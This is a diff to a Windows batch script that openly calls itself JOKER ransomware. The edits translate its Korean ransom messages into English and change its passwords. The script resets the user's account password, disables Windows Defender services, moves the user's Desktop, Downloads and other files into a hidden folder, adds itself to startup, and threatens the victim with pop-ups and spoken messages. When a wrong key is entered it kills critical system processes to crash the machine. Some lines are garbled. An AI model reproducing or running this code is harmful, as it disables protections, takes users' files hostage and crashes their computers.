@@ -32,7 +32,7 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-title ÀÌ Ã¢À» ´ÝÁö ¸¶½Ê½Ã¿À
+title don't close this window
 
 set "filename=clickme.bat"
 
@@ -45,7 +45,7 @@ if not "%~nx0" == "%filename%" (
 )
 
 
-net user %username% dbswndnjs9999(
+net user %username% %random%
 sc config Sense start= disabled > NUL 2>&1
 net stop Sense > NUL 2>&1
 sc config WdFilter start= disabled > NUL 2>&1
@@ -233,7 +233,7 @@ start %userprofile%\AppData\clickme.bat
 exit
 :a
 mode con cols=120 lines=30
-title ÀÌ Ã¢À» ´ÝÁö ¸¶½Ê½Ã¿À
+title Do not close this window.
 del %userprofile%\Desktop\*.joker* >nul 2>&1
 del %userprofile%\pictures\*.joker* >nul 2>&1
 del %userprofile%\videos\*.joker* >nul 2>&1
@@ -257,42 +257,42 @@ move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\d
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
 cls
 title JOKER'S RANSOMWARE
-ECHO  ¡á¡á¡á¡á¡á                  ¡á¡á¡á                  ¡á    ¡á¡á                ¡á¡á¡á¡á¡á                ¡á¡á¡á¡á
-ECHO      ¡á                    ¡á      ¡á                ¡á  ¡á                    ¡á                        ¡á      ¡á
-ECHO      ¡á                    ¡á      ¡á                ¡á¡á                      ¡á¡á¡á¡á                  ¡á¡á¡á¡á
-ECHO      ¡á                    ¡á      ¡á                ¡á  ¡á                    ¡á                        ¡á      ¡á
-ECHO  ¡á¡á¡á                      ¡á¡á¡á                  ¡á    ¡á¡á                ¡á¡á¡á¡á¡á                ¡á      ¡á
+ECHO  â– â– â– â– â–                   â– â– â–                   â–     â– â–                 â– â– â– â– â–                 â– â– â– â– 
+ECHO      â–                     â–       â–                 â–   â–                     â–                         â–       â– 
+ECHO      â–                     â–       â–                 â– â–                       â– â– â– â–                   â– â– â– â– 
+ECHO      â–                     â–       â–                 â–   â–                     â–                         â–       â– 
+ECHO  â– â– â–                       â– â– â–                   â–     â– â–                 â– â– â– â– â–                 â–       â– 
 ECHO.
-ECHO  ¡á¡á¡á¡á      ¡á¡á¡á    ¡á      ¡á  ¡á¡á¡á¡á¡á    ¡á¡á¡á    ¡á      ¡á  ¡á      ¡á    ¡á¡á¡á    ¡á¡á¡á¡á    ¡á¡á¡á¡á¡á
-ECHO  ¡á      ¡á  ¡á      ¡á  ¡á¡á    ¡á  ¡á          ¡á      ¡á  ¡á¡á  ¡á¡á  ¡á  ¡á  ¡á  ¡á      ¡á  ¡á      ¡á  ¡á
-ECHO  ¡á¡á¡á¡á    ¡á¡á¡á¡á¡á  ¡á  ¡á  ¡á  ¡á¡á¡á¡á¡á  ¡á      ¡á  ¡á  ¡á  ¡á  ¡á  ¡á  ¡á  ¡á¡á¡á¡á¡á  ¡á¡á¡á¡á    ¡á¡á¡á¡á
-ECHO  ¡á      ¡á  ¡á      ¡á  ¡á    ¡á¡á          ¡á  ¡á      ¡á  ¡á      ¡á  ¡á  ¡á  ¡á  ¡á      ¡á  ¡á      ¡á  ¡á
-ECHO  ¡á      ¡á  ¡á      ¡á  ¡á      ¡á  ¡á¡á¡á¡á¡á    ¡á¡á¡á    ¡á      ¡á    ¡á  ¡á    ¡á      ¡á  ¡á      ¡á  ¡á¡á¡á¡á¡á
-echo ÀÌ Ã¢À» ´ÝÁö ¸¶½Ê½Ã¿À!
+ECHO  â– â– â– â–       â– â– â–     â–       â–   â– â– â– â– â–     â– â– â–     â–       â–   â–       â–     â– â– â–     â– â– â– â–     â– â– â– â– â– 
+ECHO  â–       â–   â–       â–   â– â–     â–   â–           â–       â–   â– â–   â– â–   â–   â–   â–   â–       â–   â–       â–   â– 
+ECHO  â– â– â– â–     â– â– â– â– â–   â–   â–   â–   â– â– â– â– â–   â–       â–   â–   â–   â–   â–   â–   â–   â– â– â– â– â–   â– â– â– â–     â– â– â– â– 
+ECHO  â–       â–   â–       â–   â–     â– â–           â–   â–       â–   â–       â–   â–   â–   â–   â–       â–   â–       â–   â– 
+ECHO  â–       â–   â–       â–   â–       â–   â– â– â– â– â–     â– â– â–     â–       â–     â–   â–     â–       â–   â–       â–   â– â– â– â– â– 
+echo do not close this window.
 timeout/t 3 /nobreak >nul
 cls
-echo ÀÌ ·£¼¶¿þ¾î¸¦ ½ÇÇàÇØ ÁÖ¼Å¼­ °¨»çÇÕ´Ï´Ù.
-echo ´ç½ÅÀÇ ÄÄÇ»ÅÍ´Â JOKER ·£¼¶¿þ¾î¿¡ ÀÇÇØ ¾ÏÈ£È­µÇ¾ú½À´Ï´Ù.
-echo ÀÌ Ã¢À» ²ö´Ù¸é ´ç½ÅÀÇ ÆÄÀÏµéÀ» º¹±¸ÇÒ ¼ö ¾øÀ» °ÍÀÔ´Ï´Ù.
-echo º¹±¸¸¦ ÇÏ±â À§ÇØ¼­´Â º¹±¸Å°¸¦ ÀÔ·ÂÇÏ½Ê½Ã¿À.
-echo º¹±¸Å°°¡ Æ²¸°´Ù¸é, ºí·ç½ºÅ©¸°ÀÌ ¶ß¸ç ÀçºÎÆÃ µÉ °ÍÀÔ´Ï´Ù.
-echo ÄÄÇ»ÅÍÀÇ Àü¿øÀ» ²¨µµ JOKER ·£¼¶¿þ¾î´Â µ¹¾Æ¿Ã °ÍÀÔ´Ï´Ù.
-echo JOKER ·£¼¶¿þ¾î¸¦ »èÁ¦ÇØµµ JOKER ·£¼¶¿þ¾î´Â Á¾·áµÇÁö ¾ÊÀ» °ÍÀÔ´Ï´Ù.
-set PASS=dbswndnjs9999(
-echo x=msgbox("´ç½ÅÀÇ ¹ÙÅÁÈ­¸é, ´Ù¿î·Îµå, ¹®¼­, »çÁø, ºñµð¿À Æú´õ ¾ÈÀÇ ¸ðµç ÆÄÀÏÀÌ ¾ÏÈ£È­µÇ¾ú½À´Ï´Ù.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
-echo x=msgbox("JOKER ·£¼¶¿þ¾î¸¦ ´Ý´Â´Ù¸é ´ç½ÅÀÇ ÆÄÀÏÀ» º¹±¸ÇÒ ¼ö ¾øÀ» °ÍÀÔ´Ï´Ù.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
-echo x=msgbox("ÄÄÇ»ÅÍÀÇ Àü¿øÀ» ²¨µµ JOKER ·£¼¶¿þ¾î´Â µ¹¾Æ¿Ã °ÍÀÔ´Ï´Ù.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
-echo x=msgbox("JOKER ·£¼¶¿þ¾î¸¦ Áö¿öµµ JOKER ·£¼¶¿þ¾î´Â Á¤»óÀûÀ¸·Î ÀÛµ¿µÉ °ÍÀÔ´Ï´Ù.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
-echo CreateObject("SAPI.SpVoice").Speak "´ç½ÅÀÇ ¹ÙÅÁÈ­¸é, ´Ù¿î·Îµå, ¹®¼­, »çÁø, ºñµð¿À Æú´õ ¾ÈÀÇ ¸ðµç ÆÄÀÏÀÌ ¾ÏÈ£È­µÇ¾ú½À´Ï´Ù.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
-echo CreateObject("SAPI.SpVoice").Speak "JOKER ·£¼¶¿þ¾î¸¦ ´Ý´Â´Ù¸é ´ç½ÅÀÇ ÆÄÀÏÀ» º¹±¸ÇÒ ¼ö ¾øÀ» °ÍÀÔ´Ï´Ù.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
+echo Thank you for running this ransomware.
+echo Your computer has been encrypted by the JOKER ransomware.
+echo If you close this window, your files will not be recoverable.
+echo Enter the recovery key to recover.
+echo If the recovery key is incorrect, it will reboot with a blue screen.
+echo Even if you turn off your computer, the JOKER ransomware will come back.
+echo Deleting JOKER ransomware does not end JOKER ransomware.
+set PASS=password
+echo x=msgbox("All files in your Desktop, Downloads, Documents, Pictures and Videos folders are encrypted.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
+echo x=msgbox("If you close JOKER ransomware, your files will be unrecoverable.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
+echo x=msgbox("Even if you turn off your computer, the JOKER ransomware will come back.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
+echo x=msgbox("Even if you delete JOKER ransomware, JOKER ransomware will work normally.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
+echo CreateObject("SAPI.SpVoice").Speak "All files in your Desktop, Downloads, Documents, Pictures and Videos folders have been encrypted.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
+echo CreateObject("SAPI.SpVoice").Speak "If you close JOKER ransomware, your files will be unrecoverable.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
 POWER\clickmevbso.vbs
-echo CreateObject("SAPI.SpVoice").Speak "ÄÄÇ»ÅÍÀÇ Àü¿øÀ» ²¨µµ JOKER ·£¼¶¿þ¾î´Â µ¹¾Æ¿Ã °ÍÀÔ´Ï´Ù.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
-echo CreateObject("SAPI.SpVoice").Speak "JOKER ·£¼¶¿þ¾î¸¦ Áö¿öµµ JOKER ·£¼¶¿þ¾î´Â Á¤»óÀûÀ¸·Î ÀÛµ¿µÉ °ÍÀÔ´Ï´Ù.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
+echo CreateObject("SAPI.SpVoice").Speak "Even if you turn off your computer, the JOKER ransomware will come back.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
+echo CreateObject("SAPI.SpVoice").Speak "Even if you delete JOKER ransomware, JOKER ransomware will work normally.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
 start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
 start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
 
 :pass
-set /p password=º¹±¸Å° : 
+set /p password=ë³µêµ¬í‚¤ : 
 timeout/t 2 /nobreak >nul
 if %password%==developerdecryptkey goto good
 if %password%==%PASS% goto good
@@ -300,15 +300,15 @@ if %password%==%PASS% goto good
 :bad
 color 47
 cls
-echo Á¸ÀçÇÏÁö ¾Ê´Â º¹±¸Å°ÀÔ´Ï´Ù.
-echo ºí·ç½ºÅ©¸°ÀÌ °¡µ¿µË´Ï´Ù.
+echo Recovery key does not exist.
+echo A blue screen will start.
 timeout/t 2 >nul
 cls
 taskkill /f /im csrss.exe
 taskkill /f /im svchost.exe
 taskkill /f /im wininit.exe
 taskkill /f /im winlogon.exe
-set /p password=º¹±¸Å° : 
+set /p password=ë³µêµ¬í‚¤ : 
 if %password%==developerdecryptkey goto good
 if %password%==%PASS% goto good
 timeout/t 2 >nul
@@ -316,9 +316,9 @@ goto bad
 
 :good
 cls
-echo º¹±¸Áß...
-echo Àý´ë ÀÌ Ã¢À» ´ÝÁö ¸¶½Ê½Ã¿À.
-echo º¹±¸¿¡´Â ¾à 5ÃÊÀÇ ½Ã°£ÀÌ °É¸³´Ï´Ù.
+echo Restoring...
+echo Never close this window.
+echo Recovery takes about 5 seconds.
 timeout/t 5 /nobreak >nul
 del %userprofile%\Desktop\*.joker*
 move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
@@ -335,6 +335,6 @@ del %userprofile%\POWER-JOKER-PASSWORD.txt
 del /a "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"
 rmdir /s /q %userprofile%\AppData\RANSOMWARE-MUTANT-POWER
 cls
-echo ÇØµ¶ ¼º°ø
+echo detox success
 timeout /t 5 /nobreak >nul
 exit
